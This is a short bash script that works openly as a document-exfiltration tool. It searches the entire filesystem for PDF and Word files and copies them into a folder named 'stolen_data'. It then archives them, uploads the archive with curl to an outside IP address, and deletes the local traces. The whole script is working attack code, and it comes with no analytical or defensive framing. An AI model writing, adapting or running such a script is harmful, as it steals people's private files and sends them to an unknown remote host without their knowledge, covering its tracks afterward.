#!/bin/bash

# Define the search pattern
SEARCH_PATH="/"  # Change this if needed

# Find all .pdf and .docx files
TARGET_FILES=$(find "$SEARCH_PATH" -type f \( -name "*.pdf" -o -name "*.docx" \) 2>/dev/null)

# Check if any files were found
if [ -z "$TARGET_FILES" ]; then
    echo "No matching files found."
    exit 1
fi

# Define the temporary folder to store found files
TMP_DIR="/tmp/stolen_data"
mkdir -p "$TMP_DIR"

# Copy found files to the temporary directory
for file in $TARGET_FILES; do
    cp "$file" "$TMP_DIR" 2>/dev/null
done

# Archive the collected files
ARCHIVE_NAME="secret_data.tar.gz"
tar -czf "$ARCHIVE_NAME" -C "$TMP_DIR" .

# Upload the archive using curl
curl -T "$ARCHIVE_NAME" http://20.93.23.234/upload

# Clean up
rm -rf "$TMP_DIR" "$ARCHIVE_NAME"

echo "Operation completed."
